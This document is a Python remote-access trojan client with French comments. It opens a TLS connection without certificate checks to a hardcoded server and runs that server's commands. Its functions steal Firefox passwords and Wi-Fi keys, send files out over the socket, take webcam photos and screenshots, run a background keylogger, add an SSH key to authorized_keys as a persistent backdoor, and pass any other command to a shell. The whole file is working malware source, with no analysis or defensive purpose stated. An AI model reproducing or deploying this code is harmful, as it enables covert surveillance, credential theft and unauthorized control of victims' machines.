import socket
import ssl
import time
import subprocess
import os 
import paramiko
from pynput import keyboard
import threading
import pyautogui
from PIL import Image
import cv2


# ========== COMMANDES PERSONNALISÉES ==========

# COMMANDE : firefox
def list_firefox_profiles():
    try:
        script_path = os.path.join(os.path.dirname(__file__), "firefox_decrypt.py")
        result = subprocess.run(
            ["python3", script_path, "-l", "--no-interactive"],
            capture_output=True,
            text=True
        )
        if result.returncode != 0:
            return f"Erreur :\n{result.stderr.strip()}"
        return f"Profils Firefox détectés :\n{result.stdout}"
    except Exception as e:
        return f"Exception : {e}"

def get_firefox_passwords(profile_number, output_file="firefox_passwords.txt"):
    try:
        script_path = os.path.join(os.path.dirname(__file__), "firefox_decrypt.py")
        result = subprocess.run(
            ["python3", script_path, "-f", "human", "--no-interactive", "-c", profile_number],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return f"Erreur :\n{result.stderr.strip()}"

        with open(output_file, "w") as f:
            f.write(result.stdout)

        return f"Mots de passe exportés dans {output_file}"

    except Exception as e:
        return f"Exception : {e}"


# COMMANDE : wifi
def dump_wifi_credentials(output_file="wifi_credentials.txt"):
    try:
        path = "/etc/NetworkManager/system-connections/"
        if not os.path.isdir(path):
            return "Répertoire introuvable : NetworkManager non utilisé ?"

        creds = []

        files = os.listdir(path)
        for filename in files:
            full_path = os.path.join(path, filename)

            try:
                # Utiliser sudo cat pour obtenir le contenu (nécessite privilèges root)
                result = subprocess.run(["sudo", "cat", full_path],
                                        capture_output=True, text=True)
                if result.returncode != 0:
                    continue

                content = result.stdout

                ssid = ""
                psk = ""

                for line in content.splitlines():
                    if line.strip().startswith("id="):
                        ssid = line.strip().split("=", 1)[1]
                    if line.strip().startswith("psk="):
                        psk = line.strip().split("=", 1)[1]

                if ssid and psk:
                    creds.append(f"SSID: {ssid} | Password: {psk}")

            except Exception as e:
                continue

        if not creds:
            return "Aucune information Wi-Fi trouvée."

        with open(output_file, "w") as f:
            for entry in creds:
                f.write(entry + "\n")

        return f"Informations enregistrées dans {output_file}"

    except Exception as e:
        return f"Erreur : {e}"


# COMMANDE : download
def send_files(file_list, sock):
    import struct
    for filepath in file_list:
        if not os.path.exists(filepath):
            msg = f"__ERROR__: {filepath} not found"
            sock.send(struct.pack("!I", len(msg)))
            sock.send(msg.encode())
            continue

        try:
            filename = os.path.basename(filepath)
            filesize = os.path.getsize(filepath)

            # Envoyer le nom de fichier
            sock.send(struct.pack("!I", len(filename)))
            sock.send(filename.encode())

            # Envoyer la taille
            sock.send(struct.pack("!Q", filesize))  # Q = unsigned long long (8 bytes)

            # Envoyer le contenu
            with open(filepath, "rb") as f:
                while chunk := f.read(4096):
                    sock.sendall(chunk)
        except Exception as e:
            msg = f"__ERROR__: Failed to send {filepath}: {e}"
            sock.send(struct.pack("!I", len(msg)))
            sock.send(msg.encode())



# COMMANDE : webcam
def capture_webcam(filename="webcam.jpg"):
    try:
        cam = cv2.VideoCapture(0)  # 0 = webcam par défaut
        if not cam.isOpened():
            return("Impossible d'accéder à la webcam.")
            
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(filename, frame)
            return(f"Photo capturée et enregistrée sous : {filename}")
        else:
            return("Erreur lors de la capture de la photo.")
        cam.release()

    except Exception as e:
        return(f"Exception : {e}")


# COMMANDE : screenshot
def screenshot():
    try: 
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.jpg", "JPEG")
        return "Capture d'écran sauvegardée en format .jpg sous 'screenshot.jpg'."
    except Exception as e:
        return f"Erreur screenshot : {e}"


# COMMANDE : keylogger
pressed_keys = set()
text = ""

def start_keylogger_thread():
    thread = threading.Thread(target=start_keylogger, daemon=True)
    thread.start()
    return "Keylogger démarré en arrière-plan."

def start_keylogger():
    global text
    current_dir = os.getcwd()
    log_file_path = os.path.join(current_dir, "keylog.txt")

    if os.path.exists(log_file_path):
        os.remove(log_file_path)

    def write_to_file(data):
        with open(log_file_path, "a") as f:
            f.write(data)
            f.flush()

    def on_press(key):
        global text
        try:
            if key not in pressed_keys:
                pressed_keys.add(key)

                if key == keyboard.Key.enter:
                    text += "\n"
                elif key == keyboard.Key.tab:
                    text += "\t"
                elif key == keyboard.Key.space:
                    text += " "
                elif key == keyboard.Key.backspace:
                    text = text[:-1]
                elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift):
                    pass
                elif key == keyboard.Key.esc:
                    return False  # stop listener
                else:
                    text += str(key).strip("'")

                write_to_file(text)
                time.sleep(0.01)
        except Exception as e:
            write_to_file(f"[Erreur] {e}\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()




# COMMANDE : generate_ssh_keypair
def generate_ssh_keypair(passphrase="test",
                         private_key_path="id_rsa",
                         public_key_path="id_rsa.pub"):
    try:
        authorized_keys_path = os.path.expanduser("~/.ssh/authorized_keys")
        ssh_dir = os.path.expanduser("~/.ssh")
        
        # Générer la paire de clés
        private_key = paramiko.RSAKey.generate(2048)
        private_key.write_private_key_file(private_key_path, password=passphrase)
        public_key = private_key.get_name() + " " + private_key.get_base64()

        # Sauvegarder la clé publique
        with open(public_key_path, "w") as public_key_file:
            public_key_file.write(public_key)

        # Créer le dossier .ssh s'il n'existe pas
        if not os.path.exists(ssh_dir):
            os.makedirs(ssh_dir, mode=0o700)

        # Ajouter la clé dans authorized_keys si elle n'y est pas déjà
        if not os.path.exists(authorized_keys_path):
            open(authorized_keys_path, "w").close()
            os.chmod(authorized_keys_path, 0o600)

        with open(authorized_keys_path, "r+") as auth_file:
            existing_keys = auth_file.read()
            if public_key not in existing_keys:
                auth_file.write(public_key + "\n")

        return f"Clés générées : {private_key_path}, {public_key_path}"

    except Exception as e:
        return f"Erreur : {e}"


# COMMANDE : all
def exec_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Erreur exécution : {e}"



# ========== HANDLE ==========
def get_ip():
    try:
        return subprocess.check_output("hostname -I", shell=True).decode().strip()
    except Exception as e:
        return f"Erreur IP : {e}"
 
def handle_command(cmd):
    if cmd == "get_ip":
        return get_ip()
    elif cmd == "generate_ssh_keypair":
        return generate_ssh_keypair()
    elif cmd == "start_keylogger":
        return start_keylogger_thread()
    elif cmd == "screenshot":
        return screenshot()
    elif cmd == "webcam":
        return capture_webcam()
    elif cmd.startswith("download "):
        files = cmd.split(" ", 1)[1].split(";")
        send_files(files, client_socket)
        return "[✓] Fichiers envoyés"
    elif cmd == "wifi":
        return dump_wifi_credentials()
    elif cmd == "firefox_profiles":
        return list_firefox_profiles()
    elif cmd.startswith("firefox_password "):
        profile_number = cmd.split(" ", 1)[1]
        return get_firefox_passwords(profile_number)
    else:
        return exec_cmd(cmd)




# ========== CLIENT MAIN ==========

HOST = "192.168.2.4"
PORT = 12345

#création du socket client
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

sock = socket.create_connection((HOST, PORT))
client_socket = context.wrap_socket(sock, server_hostname=HOST)

print(f"Connecté au serveur {HOST}:{PORT}")


#échange des messages
try:
    while True:
        command = client_socket.recv(4096).decode().strip().lower()
        if command == "exit":
            print("[~] Fermeture demandée.")
            break
        elif command == "disconnect":
            print("[~] Déconnexion demandée par le serveur.")
            try:
                client_socket.send("[~] Client va se déconnecter.".encode())
                client_socket.shutdown(socket.SHUT_RDWR)
            except Exception as e:
                print(f"Erreur fermeture socket : {e}")
            finally:
                client_socket.close()
                break  


        response = handle_command(command)
        if response is None or str(response).strip() == "":
            response = "[✓]"
        client_socket.send(response.encode())
except Exception as e:
    print(f"Erreur côté client : {e}")
finally:
    client_socket.close()
